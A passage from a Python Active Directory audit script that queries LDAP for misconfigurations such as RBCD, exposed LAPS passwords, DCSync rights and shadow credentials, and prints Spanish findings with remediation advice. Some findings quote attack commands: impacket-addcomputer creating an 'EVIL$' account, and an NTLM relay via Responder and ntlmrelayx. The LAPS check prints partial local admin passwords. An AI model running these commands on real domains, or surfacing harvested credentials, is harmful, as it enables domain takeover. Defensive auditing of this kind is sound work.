    """CHECK 8: Resource-Based Constrained Delegation"""
    section("CHECK 08 — RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)")
    try:
        conn.search(base_dn,
            '(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))',
            attributes=['sAMAccountName','msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if conn.entries:
            rbcd_targets = [str(e.sAMAccountName) for e in conn.entries]
            finding("ALTO", "Kerberos Delegation",
                f"RBCD configurado en {len(rbcd_targets)} máquina(s)",
                rbcd_targets,
                "Verificar que los ACEs de RBCD son intencionales. Un atacante con GenericWrite puede abusar de RBCD para tomar control.",
                7.5, ["https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution"])
        else:
            print(f"  {G}[OK]{W} Sin RBCD configurado (o sin permisos para verlo).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_09_laps(conn, base_dn, ldap3):
    """CHECK 9: LAPS no desplegado o con exposición"""
    section("CHECK 09 — LAPS (Local Administrator Password Solution)")
    try:
        # Verificar si LAPS está instalado (ms-MCS-AdmPwd attribute)
        conn.search(base_dn,
            '(&(objectClass=computer)(ms-MCS-AdmPwd=*))',
            attributes=['sAMAccountName','ms-MCS-AdmPwd','ms-MCS-AdmPwdExpirationTime'])
        laps_deployed = bool(conn.entries)

        # Intentar leer contraseñas LAPS (requiere permisos excesivos)
        exposed_passwords = []
        for e in conn.entries:
            pwd = str(e['ms-MCS-AdmPwd'])
            if pwd and pwd != '[]' and len(pwd) > 2:
                exposed_passwords.append(f"{e.sAMAccountName}: {pwd[:10]}... ← CONTRASEÑA VISIBLE!")

        if not laps_deployed:
            # Buscar máquinas SIN LAPS
            conn.search(base_dn,
                '(&(objectClass=computer)(!(ms-MCS-AdmPwd=*)))',
                attributes=['sAMAccountName','operatingSystem'])
            machines_without = [str(e.sAMAccountName) for e in conn.entries]
            if machines_without:
                finding("MEDIO", "LAPS / Local Accounts",
                    f"LAPS NO desplegado en {len(machines_without)} máquina(s)",
                    machines_without[:10],
                    "Desplegar LAPS o Windows LAPS (Windows 2023+) en todas las máquinas. Elimina contraseñas locales compartidas.",
                    6.5, ["https://docs.microsoft.com/en-us/defender-for-identity/laps"])
        if exposed_passwords:
            finding("CRÍTICO", "LAPS / Credential Exposure",
                f"Contraseñas LAPS VISIBLES para usuarios autenticados ({len(exposed_passwords)} máquinas)",
                exposed_passwords,
                "Restringir ACLs en ms-MCS-AdmPwd. Solo Domain Admins y cuentas Helpdesk autorizadas deben tener read access.",
                9.1, ["https://attack.mitre.org/techniques/T1552/"])
        elif laps_deployed:
            print(f"  {G}[OK]{W} LAPS desplegado y contraseñas no accesibles con este usuario.")
    except Exception as e:
        if "00002085" in str(e) or "noSuchAttribute" in str(e).lower():
            print(f"  {Y}[!]{W} LAPS no instalado en este dominio.")
            finding("BAJO", "LAPS",
                "LAPS no detectado en el dominio",
                "No se encontró el atributo ms-MCS-AdmPwd. LAPS podría no estar instalado.",
                "Instalar y desplegar Microsoft LAPS o Windows LAPS para gestión de contraseñas locales de administrador.",
                4.0)
        else:
            print(f"  {Y}[?]{W} {e}")

def check_10_domain_admins(conn, base_dn, ldap3):
    """CHECK 10: Cuentas en grupos privilegiados"""
    section("CHECK 10 — Grupos Privilegiados (Domain Admins, Enterprise Admins, etc.)")
    privileged_groups = [
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Account Operators", "Backup Operators",
        "Print Operators", "Server Operators", "Group Policy Creator Owners"
    ]
    try:
        all_priv_members = {}
        for group in privileged_groups:
            conn.search(base_dn,
                f'(&(objectClass=group)(cn={group}))',
                attributes=['member'])
            if conn.entries and conn.entries[0].member:
                members = conn.entries[0].member.values if hasattr(conn.entries[0].member, 'values') else [conn.entries[0].member]
                members_clean = []
                for m in members:
                    cn_match = re.search(r'CN=([^,]+)', str(m))
                    if cn_match: members_clean.append(cn_match.group(1))
                if members_clean:
                    all_priv_members[group] = members_clean

        if all_priv_members:
            details = []
            high_count = sum(len(v) for v in all_priv_members.values())
            for grp, members in all_priv_members.items():
                details.append(f"{grp} ({len(members)} miembros): {', '.join(members[:5])}")

            sev = "CRÍTICO" if high_count > 20 else "ALTO" if high_count > 5 else "MEDIO"
            finding(sev, "Privileged Accounts",
                f"Grupos Privilegiados con {high_count} miembro(s) total",
                details,
                "Aplicar principio de mínimo privilegio. Usar cuentas dedicadas para administración. Auditar regularmente miembros.",
                7.0 if sev == "MEDIO" else 8.5)
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_11_inactive_accounts(conn, base_dn, ldap3):
    """CHECK 11: Cuentas inactivas y habilitadas"""
    section("CHECK 11 — Cuentas de Usuario Inactivas (>90 días)")
    try:
        from ldap3.utils.conv import format_time
        # lastLogonTimestamp con 90 días de antigüedad (en 100-nanosecond intervals)
        # 90 días = 90 * 24 * 3600 * 10000000
        import struct
        ninety_days = 90 * 24 * 3600 * 10_000_000
        # Fecha actual en FILETIME
        import time
        now_ft = int((datetime.now(timezone.utc).timestamp() + 11644473600) * 10_000_000)
        cutoff = now_ft - ninety_days
        # Convertir a LDAP timestamp string
        conn.search(base_dn,
            f'(&(objectClass=user)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2))(lastLogonTimestamp<={cutoff}))',
            attributes=['sAMAccountName','lastLogonTimestamp','description'],
            size_limit=50)
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            finding("MEDIO", "Account Hygiene",
                f"{len(conn.entries)} Cuentas Habilitadas sin Login >90 días",
                users[:15],
                "Deshabilitar o eliminar cuentas inactivas. Implementar revisión trimestral de cuentas. Usar Stale Accounts GPO.",
                5.0, ["https://attack.mitre.org/techniques/T1078/002/"])
        else:
            print(f"  {G}[OK]{W} Sin cuentas inactivas >90 días detectadas.")
    except Exception as e:
        print(f"  {Y}[?]{W} Error cuentas inactivas: {e}")

def check_12_password_not_required(conn, base_dn, ldap3):
    """CHECK 12: Cuentas que no requieren contraseña"""
    section("CHECK 12 — Cuentas sin Contraseña Requerida (PASSWD_NOTREQD)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=32))',
            attributes=['sAMAccountName','userAccountControl'])
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            finding("ALTO", "Weak Authentication",
                f"{len(users)} Cuenta(s) sin Contraseña Requerida (PASSWD_NOTREQD)",
                users,
                "Limpiar flag PASSWD_NOTREQD: Set-ADUser -Identity usuario -PasswordNotRequired $false",
                7.2)
        else:
            print(f"  {G}[OK]{W} Sin cuentas con PASSWD_NOTREQD.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_13_password_never_expires(conn, base_dn, ldap3):
    """CHECK 13: Contraseñas que nunca expiran"""
    section("CHECK 13 — Contraseñas que Nunca Expiran")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName','description'])
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            sev = "ALTO" if len(users) > 20 else "MEDIO"
            finding(sev, "Password Hygiene",
                f"{len(users)} Cuenta(s) Habilitadas con Contraseña que Nunca Expira",
                users[:15],
                "Configurar expiración de contraseñas. Excepciones solo para cuentas de servicio usando MSA/gMSA.",
                6.0)
        else:
            print(f"  {G}[OK]{W} Sin cuentas con contraseña que nunca expira (habilitadas).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_14_admin_count(conn, base_dn, ldap3):
    """CHECK 14: Cuentas con adminCount=1 (herencia de permisos)"""
    section("CHECK 14 — adminCount=1 (Protected Users heredados)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(!(objectClass=computer))(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName','memberOf'])
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            finding("MEDIO", "Privileged Accounts",
                f"{len(users)} Cuentas con adminCount=1 (incluso si ya no son admin)",
                users[:15],
                "Limpiar cuentas que ya no son privilegiadas pero tienen adminCount=1. Hereda ACLs del AdminSDHolder y puede ser explotado.",
                5.5, ["https://attack.mitre.org/techniques/T1078/002/"])
        else:
            print(f"  {G}[OK]{W} Sin cuentas con adminCount=1 no privilegiadas.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_15_dcsync_rights(conn, base_dn, ldap3):
    """CHECK 15: Privilegios DCSync (GetChangesAll)"""
    section("CHECK 15 — DCSync Rights (DS-Replication-Get-Changes-All)")
    try:
        import binascii
        # Buscar ACEs en el domain object con derechos de replicación
        conn.search(base_dn, '(objectClass=domain)',
                    attributes=['nTSecurityDescriptor'],
                    controls=[('1.2.840.113556.1.4.801', True, None)])
        if conn.entries:
            sd = conn.entries[0]['nTSecurityDescriptor']
            sd_str = str(sd)
            # Buscar GUID de GetChanges / GetChangesAll en el descriptor
            get_changes      = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
            get_changes_all  = "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"
            get_changes_filt = "89e95b76-444d-4c62-991a-0facbeda640c"

            guids_found = []
            if get_changes_all.replace('-','').lower() in sd_str.lower():
                guids_found.append("DS-Replication-Get-Changes-All detectado en nTSecurityDescriptor")
            if get_changes_filt.replace('-','').lower() in sd_str.lower():
                guids_found.append("DS-Replication-Get-Changes-In-Filtered-Set detectado")

            if guids_found:
                finding("CRÍTICO", "DCSync / Replication",
                    "Posibles Derechos DCSync en el Objeto Dominio",
                    guids_found + ["Verificar con: (Get-ObjectAcl -DistinguishedName 'DC=...' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication'})"],
                    "Remover ACEs de replicación no autorizados. Solo Domain Controllers deben tener GetChangesAll.",
                    9.8, ["https://attack.mitre.org/techniques/T1003/006/"])
            else:
                print(f"  {G}[OK]{W} Sin derechos DCSync obvios detectados via LDAP (verificar con PowerView para análisis completo).")
        else:
            print(f"  {Y}[?]{W} No se pudo leer nTSecurityDescriptor del dominio.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_16_machine_account_quota(conn, base_dn, ldap3):
    """CHECK 16: ms-DS-MachineAccountQuota — permiso para unir máquinas al dominio"""
    section("CHECK 16 — Machine Account Quota (ms-DS-MachineAccountQuota)")
    try:
        conn.search(base_dn, '(objectClass=domain)',
                    attributes=['ms-DS-MachineAccountQuota'])
        if conn.entries:
            quota = int(str(conn.entries[0]['ms-DS-MachineAccountQuota'] or 10))
            if quota > 0:
                finding("MEDIO", "Domain Configuration",
                    f"ms-DS-MachineAccountQuota = {quota} (cualquier usuario puede unir hasta {quota} máquinas al dominio)",
                    [f"Quota actual: {quota}",
                     "Permite a atacantes con cuentas bajas crear cuentas de máquina para RBCD y otros ataques.",
                     "Explotable con: impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password1' -dc-host DC"],
                    "Cambiar ms-DS-MachineAccountQuota a 0. Solo admins deben poder unir máquinas.",
                    6.5, ["https://blog.netspi.com/machineaccountquota-is-useful-sometimes/"])
            else:
                print(f"  {G}[OK]{W} ms-DS-MachineAccountQuota = 0 (seguro).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_17_guest_account(conn, base_dn, ldap3):
    """CHECK 17: Cuenta Guest habilitada"""
    section("CHECK 17 — Cuenta Guest Habilitada")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(cn=Guest)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName','userAccountControl'])
        if conn.entries:
            finding("ALTO", "Account Hygiene",
                "Cuenta Guest HABILITADA en el Dominio",
                ["La cuenta Guest permite acceso sin autenticación a recursos compartidos.",
                 "Vector de escalación y movimiento lateral."],
                "Deshabilitar inmediatamente: Disable-ADAccount -Identity Guest",
                7.0)
        else:
            print(f"  {G}[OK]{W} Cuenta Guest deshabilitada.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_18_gpo_analysis(conn, base_dn, ldap3):
    """CHECK 18: GPOs — configuraciones de seguridad críticas"""
    section("CHECK 18 — Group Policy Objects (GPOs)")
    try:
        conn.search(f"CN=Policies,CN=System,{base_dn}",
            '(objectClass=groupPolicyContainer)',
            attributes=['cn','displayName','gPCFileSysPath','versionNumber'])
        if conn.entries:
            gpo_count = len(conn.entries)
            print(f"  {C}[+]{W} {gpo_count} GPOs encontrados en el dominio")
            # Buscar GPOs con paths de red (para detectar GPOs con scripts)
            network_gpos = [str(e.displayName) for e in conn.entries
                           if e.gPCFileSysPath and '\\\\' in str(e.gPCFileSysPath)]
            if network_gpos:
                finding("INFO", "GPO Audit",
                    f"{gpo_count} GPOs detectados — Auditoría recomendada",
                    [f"GPOs en paths de red: {', '.join(network_gpos[:5])}",
                     "Ejecutar: BloodHound para análisis completo de ACLs de GPOs",
                     "Verificar: Get-GPO -All | Get-GPOReport -ReportType XML"],
                    "Auditar GPOs con BloodHound. Verificar ACEs que permitan escritura en GPOs a usuarios no admin.",
                    0.0)
        else:
            print(f"  {D}[i]{W} Sin GPOs accesibles (puede requerir autenticación).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_19_trusts(conn, base_dn, ldap3):
    """CHECK 19: Domain Trusts — relaciones de confianza"""
    section("CHECK 19 — Domain Trusts")
    try:
        conn.search(base_dn, '(objectClass=trustedDomain)',
                    attributes=['cn','trustDirection','trustType','trustAttributes'])
        if conn.entries:
            trusts = []
            for t in conn.entries:
                direction = {1:"Inbound (ellos confían en nosotros)", 2:"Outbound (nosotros confiamos en ellos)", 3:"Bidireccional"}.get(int(str(t.trustDirection or 0)), "Desconocido")
                attrs = int(str(t.trustAttributes or 0))
                transitive = "SID Filtering: " + ("DESHABILITADO ⚠" if not (attrs & 64) else "habilitado")
                trusts.append(f"{t.cn} → {direction} | {transitive}")

            finding("MEDIO", "Domain Trusts",
                f"{len(trusts)} Trust(s) de Dominio Detectado(s)",
                trusts,
                "Auditar cada trust. Habilitar SID Filtering. Evaluar si trusts bidireccionales son necesarios. Usar selectiveauthentication.",
                5.5, ["https://attack.mitre.org/techniques/T1482/"])
        else:
            print(f"  {G}[OK]{W} Sin domain trusts externos detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_20_recycle_bin(conn, base_dn, ldap3):
    """CHECK 20: AD Recycle Bin no habilitado"""
    section("CHECK 20 — AD Recycle Bin")
    try:
        conn.search(f"CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,{base_dn}",
            '(cn=Recycle Bin Feature)',
            attributes=['msDS-EnabledFeatureBL'])
        if conn.entries and conn.entries[0]['msDS-EnabledFeatureBL']:
            print(f"  {G}[OK]{W} AD Recycle Bin habilitado.")
        else:
            finding("BAJO", "AD Configuration",
                "AD Recycle Bin NO Habilitado",
                "Sin Recycle Bin, objetos eliminados son irrecuperables. Dificulta recuperación de incidentes.",
                "Habilitar: Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target $forest",
                3.0)
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_21_spooler_service(conn, base_dn, ldap3):
    """CHECK 21: PrintNightmare — detectar DCs con Spooler expuesto"""
    section("CHECK 21 — PrintNightmare / Print Spooler en DCs (CVE-2021-1675)")
    try:
        # Los DCs son computadoras con ServerRole incluido
        conn.search(base_dn,
            '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
            attributes=['sAMAccountName','dNSHostName','operatingSystem','operatingSystemVersion'])
        if conn.entries:
            dcs = [f"{e.dNSHostName} ({e.operatingSystem})" for e in conn.entries]
            finding("INFO", "PrintNightmare",
                f"{len(dcs)} Domain Controller(s) detectado(s) — Verificar Print Spooler",
                dcs + ["Verificar manualmente: Get-Service -Name Spooler -ComputerName DC",
                       "Si Spooler activo en DC → vulnerable a PrintNightmare (CVE-2021-1675)"],
                "Deshabilitar Print Spooler en todos los DCs: Set-Service -Name Spooler -StartupType Disabled -ComputerName DC",
                8.8, ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675"])
        else:
            print(f"  {D}[i]{W} Sin DCs detectados en este contexto.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_22_krbtgt_password_age(conn, base_dn, ldap3):
    """CHECK 22: Edad de la contraseña de KRBTGT"""
    section("CHECK 22 — KRBTGT Password Age (Golden Ticket defense)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(sAMAccountName=krbtgt))',
            attributes=['pwdLastSet','sAMAccountName'])
        if conn.entries:
            krbtgt = conn.entries[0]
            pwd_set = str(krbtgt.pwdLastSet)
            if pwd_set == '0' or not pwd_set:
                finding("ALTO", "Golden Ticket Defense",
                    "KRBTGT: Contraseña nunca cambiada o timestamp no disponible",
                    ["Contraseña de KRBTGT posiblemente muy antigua.",
                     "Si un atacante tiene el hash KRBTGT → puede forjar Golden Tickets válidos indefinidamente."],
                    "Cambiar contraseña de KRBTGT DOS VECES (con 10h entre cambios). Documentar el proceso en SLA de seguridad.",
                    8.0, ["https://attack.mitre.org/techniques/T1558/001/"])
            else:
                # Calcular edad aproximada del password
                try:
                    # FILETIME to datetime
                    ft = int(pwd_set)
                    if ft > 0:
                        import datetime as dt
                        epoch = dt.datetime(1601, 1, 1, tzinfo=timezone.utc)
                        pwd_dt = epoch + dt.timedelta(microseconds=ft // 10)
                        age_days = (datetime.now(timezone.utc) - pwd_dt).days
                        if age_days > 180:
                            finding("MEDIO", "Golden Ticket Defense",
                                f"KRBTGT: Contraseña tiene {age_days} días (recomendado <180)",
                                [f"Última rotación estimada: hace {age_days} días",
                                 "KRBTGT viejo aumenta ventana de Golden Ticket attacks."],
                                "Rotar KRBTGT dos veces con intervalo de replicación entre cada cambio.",
                                5.5)
                        else:
                            print(f"  {G}[OK]{W} KRBTGT rotado hace ~{age_days} días.")
                except:
                    print(f"  {D}[i]{W} KRBTGT pwdLastSet: {pwd_set}")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_23_protected_users(conn, base_dn, ldap3):
    """CHECK 23: Admins fuera del grupo Protected Users"""
    section("CHECK 23 — Protected Users Group (defensa contra Pass-the-Hash)")
    try:
        # Obtener Domain Admins
        conn.search(base_dn, '(&(objectClass=group)(cn=Domain Admins))', attributes=['member'])
        das = set()
        if conn.entries and conn.entries[0].member:
            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
            for m in members:
                cn_match = re.search(r'CN=([^,]+)', str(m))
                if cn_match: das.add(cn_match.group(1).lower())

        # Obtener Protected Users
        conn.search(base_dn, '(&(objectClass=group)(cn=Protected Users))', attributes=['member'])
        protected = set()
        if conn.entries and conn.entries[0].member:
            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
            for m in members:
                cn_match = re.search(r'CN=([^,]+)', str(m))
                if cn_match: protected.add(cn_match.group(1).lower())

        not_protected = das - protected
        if not_protected:
            finding("ALTO", "Protected Users",
                f"{len(not_protected)} Domain Admin(s) FUERA del grupo Protected Users",
                list(not_protected),
                "Agregar todos los DA y cuentas privilegiadas al grupo Protected Users. Previene Pass-the-Hash, credenciales en memoria y delegación.",
                7.5, ["https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group"])
        else:
            print(f"  {G}[OK]{W} Todos los Domain Admins están en Protected Users.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_24_dns_admins(conn, base_dn, ldap3):
    """CHECK 24: Miembros del grupo DnsAdmins (DLL injection en DNS)"""
    section("CHECK 24 — DnsAdmins Group (DLL Injection Privilege Escalation)")
    try:
        conn.search(base_dn, '(&(objectClass=group)(cn=DnsAdmins))', attributes=['member'])
        if conn.entries and conn.entries[0].member:
            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
            members_clean = []
            for m in members:
                cn_match = re.search(r'CN=([^,]+)', str(m))
                if cn_match: members_clean.append(cn_match.group(1))
            if members_clean:
                finding("ALTO", "DnsAdmins Escalation",
                    f"DnsAdmins tiene {len(members_clean)} miembro(s) — Escalación a SYSTEM posible",
                    members_clean,
                    "Vaciar el grupo DnsAdmins. Usar privilegios específicos para gestión DNS en vez de este grupo.",
                    8.0, ["https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"])
        else:
            print(f"  {G}[OK]{W} DnsAdmins vacío o no accesible.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_25_backup_operators(conn, base_dn, ldap3):
    """CHECK 25: Backup Operators — pueden dumpejar NTDS.dit"""
    section("CHECK 25 — Backup Operators (potencial dump de NTDS.dit)")
    try:
        conn.search(base_dn, '(&(objectClass=group)(cn=Backup Operators))', attributes=['member'])
        if conn.entries and conn.entries[0].member:
            members_val = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
            members_clean = []
            for m in members_val:
                cn_match = re.search(r'CN=([^,]+)', str(m))
                if cn_match: members_clean.append(cn_match.group(1))
            if members_clean:
                finding("ALTO", "Privileged Groups",
                    f"Backup Operators: {len(members_clean)} miembro(s) — Pueden dumpejar NTDS.dit",
                    members_clean,
                    "Vaciar Backup Operators si no es necesario. Monitorear uso de SeBackupPrivilege. Usar soluciones de backup dedicadas.",
                    8.0, ["https://attack.mitre.org/techniques/T1003/003/"])
        else:
            print(f"  {G}[OK]{W} Backup Operators vacío.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_26_exchange_permissions(conn, base_dn, ldap3):
    """CHECK 26: Exchange — permisos de writeDACL en el dominio"""
    section("CHECK 26 — Exchange Windows Permissions (WriteDACL → DCSync)")
    try:
        conn.search(base_dn, '(&(objectClass=group)(cn=Exchange Windows Permissions))', attributes=['member'])
        if conn.entries:
            member_count = 0
            if conn.entries[0].member:
                vals = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
                member_count = len([v for v in vals if v])
            if member_count > 0:
                finding("CRÍTICO", "Exchange Escalation",
                    f"Exchange Windows Permissions: {member_count} miembro(s) — WriteDACL en el dominio",
                    [f"{member_count} objetos en el grupo",
                     "Exchange Windows Permissions tiene WriteDACL sobre el objeto dominio.",
                     "Si un atacante compromete Exchange, puede otorgarse derechos DCSync."],
                    "Aplicar Microsoft Exchange Security Hotfix. Usar split permissions model. Auditar ACLs del objeto dominio.",
                    9.8, ["https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/",
                          "https://github.com/gdedrouas/Exchange-AD-Privesc"])
        else:
            print(f"  {G}[OK]{W} Exchange Windows Permissions no encontrado (Exchange no instalado o ya parcheado).")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_27_ldap_signing(conn, base_dn, ldap3):
    """CHECK 27: LDAP Signing no requerido"""
    section("CHECK 27 — LDAP Signing y Channel Binding")
    try:
        conn.search(f"CN=Default Domain Controllers Policy,CN=Policies,CN=System,{base_dn}",
            '(objectClass=groupPolicyContainer)',
            attributes=['gPCFileSysPath','displayName'])
        print(f"  {D}[i]{W} Verificar LDAP signing requiere leer GPO files:")
        print(f"  {D}    Registro: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\LDAPServerIntegrity{W}")
        print(f"  {D}    0=None, 1=Negotiate, 2=Required{W}")
        print(f"  {Y}    Probar automáticamente:{W} ldap-signing-check.py / nmap --script ldap-rootdse -p 389")
        finding("INFO", "LDAP Security",
            "LDAP Signing — Verificar Manualmente",
            ["Si LDAPServerIntegrity < 2 → permite LDAP relay attacks",
             "Exploit: NTLM relay via Responder + ntlmrelayx.py --ldate",
             f"nmap: nmap -p 389 --script ldap-rootdse {args.dc}"],
            "GPO: Domain Controller: LDAP server signing requirements = Require signing. Habilitar LDAP Channel Binding.",
            6.5, ["https://msrc.microsoft.com/update-guide/vulnerability/ADV190023"])
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_28_rodc_krbtgt(conn, base_dn, ldap3):
    """CHECK 28: RODCs — contraseñas en Allowed Password Replication Policy"""
    section("CHECK 28 — RODCs (Read-Only Domain Controllers)")
    try:
        conn.search(base_dn,
            '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))',
            attributes=['sAMAccountName','dNSHostName','msDS-RevealedList'])
        if conn.entries:
            rodcs = [str(e.dNSHostName or e.sAMAccountName) for e in conn.entries]
            finding("INFO", "RODC Security",
                f"{len(rodcs)} RODC(s) detectado(s) — Auditar Password Replication Policy",
                rodcs + ["Verificar: Get-ADDomainController -Filter {IsReadOnly -eq $true}",
                         "Auditar: (Get-ADDomainController RODC).ComputerObjectDN | Get-ADObject -Properties 'msDS-RevealedList'"],
                "Revisar cuentas en Allowed PRP. Evitar cuentas privilegiadas en RODCs.",
                0.0)
        else:
            print(f"  {D}[i]{W} Sin RODCs detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_29_shadow_credentials(conn, base_dn, ldap3):
    """CHECK 29: Shadow Credentials (msDS-KeyCredentialLink)"""
    section("CHECK 29 — Shadow Credentials (msDS-KeyCredentialLink)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(msDS-KeyCredentialLink=*))',
            attributes=['sAMAccountName','msDS-KeyCredentialLink'])
        if conn.entries:
            users = [str(e.sAMAccountName) for e in conn.entries]
            finding("CRÍTICO", "Shadow Credentials",
                f"Shadow Credentials en {len(users)} cuenta(s) — Posible backdoor de autenticación",
                users,
                "Auditar msDS-KeyCredentialLink con: Get-ADObject -Filter {msDS-KeyCredentialLink -ne '$null'} | Limpiar entradas no autorizadas.",
                9.0, ["https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"])
        else:
            print(f"  {G}[OK]{W} Sin Shadow Credentials detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_30_gpo_scripts(conn, base_dn, ldap3):
    """CHECK 30: Scripts en GPOs — posibles persistencias"""
    section("CHECK 30 — GPO Scripts (Logon/Logoff/Startup/Shutdown)")
    try:
        conn.search(f"CN=Policies,CN=System,{base_dn}",
            '(objectClass=groupPolicyContainer)',
            attributes=['cn','displayName','gPCFileSysPath'])

        gpos_with_scripts = []
        for gpo in conn.entries:
            path = str(gpo.gPCFileSysPath or '')
            name = str(gpo.displayName or gpo.cn)
            if '\\\\' in path:
                gpos_with_scripts.append(f"{name}: {path}")

        if gpos_with_scripts:
            finding("INFO", "GPO Scripts",
                f"{len(gpos_with_scripts)} GPO(s) con paths de scripts detectados",
                gpos_with_scripts[:8] + ["Revisar scripts en: SYSVOL\\\\dominio\\\\Policies\\\\{{GUID}}\\\\Machine\\\\Scripts\\\\"],
                "Auditar scripts de GPO regularmente. Monitorear modificaciones en SYSVOL.",
                0.0)
        else:
            print(f"  {D}[i]{W} Sin GPOs con scripts accesibles detectados.")
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_31_fine_grained_policy(conn, base_dn, ldap3):
    """CHECK 31: Fine-Grained Password Policies (PSOs)"""
    section("CHECK 31 — Fine-Grained Password Policies (PSOs)")
    try:
        conn.search(f"CN=Password Settings Container,CN=System,{base_dn}",
            '(objectClass=msDS-PasswordSettings)',
            attributes=['cn','msDS-MinimumPasswordLength','msDS-LockoutThreshold',
                        'msDS-PasswordSettingsPrecedence'])
        if conn.entries:
            psos = []
            for pso in conn.entries:
                min_len = str(pso['msDS-MinimumPasswordLength'] or '?')
                lockout = str(pso['msDS-LockoutThreshold'] or '?')
                psos.append(f"{pso.cn}: minLen={min_len}, lockout={lockout}")
            finding("INFO", "Fine-Grained Policy",
                f"{len(psos)} PSO(s) — Verificar que no debiliten la política global",
                psos,
                "Auditar PSOs. Un PSO mal configurado puede tener contraseñas más débiles que la política del dominio.",
                0.0)
        else:
            print(f"  {D}[i]{W} Sin Fine-Grained Password Policies detectadas.")
    except Exception as e:
        if "No such object" in str(e):
            print(f"  {D}[i]{W} Sin PSOs configurados en este dominio.")
        else:
            print(f"  {Y}[?]{W} {e}")

def check_32_ous_delegation(conn, base_dn, ldap3):
    """CHECK 32: Delegaciones en OUs — posibles paths de escalación"""
    section("CHECK 32 — OU Delegations (GenericAll / GenericWrite)")
    try:
        conn.search(base_dn, '(objectClass=organizationalUnit)',
                    attributes=['distinguishedName','ou'],
                    controls=[('1.2.840.113556.1.4.801', True, None)])
        if conn.entries:
            ou_count = len(conn.entries)
            print(f"  {C}[+]{W} {ou_count} OUs encontradas — Para análisis completo usar BloodHound")
            finding("INFO", "OU Delegations",
                f"{ou_count} OUs detectadas — Analizar ACLs con BloodHound",
                [f"OUs encontradas: {ou_count}",
                 "BloodHound: Edges GenericAll, GenericWrite, WriteDACL, WriteOwner sobre OUs son críticos.",
                 "PowerView: Get-DomainObjectAcl -SearchBase 'OU=...' -ResolveGUIDs"],
                "Auditar delegaciones en OUs. Eliminar permisos excesivos. Usar BloodHound para visualizar paths de ataque.",
                0.0, ["https://bloodhound.readthedocs.io/"])
    except Exception as e:
        print(f"  {Y}[?]{W} {e}")

def check_33_mssql_spns(conn, base_dn, ldap3):
    """CHECK 33: SQL Server SPNs — objetivo frecuente de Kerberoasting"""
    section("CHECK 33 — SQL Server SPNs (MSSQLSvc)")
    try:
        conn.search(base_dn,
            '(&(objectClass=user)(servicePrincipalName=MSSQLSvc/*))',
            attributes=['sAMAccountName','servicePrincipalName','memberOf'])
        if conn.entries:
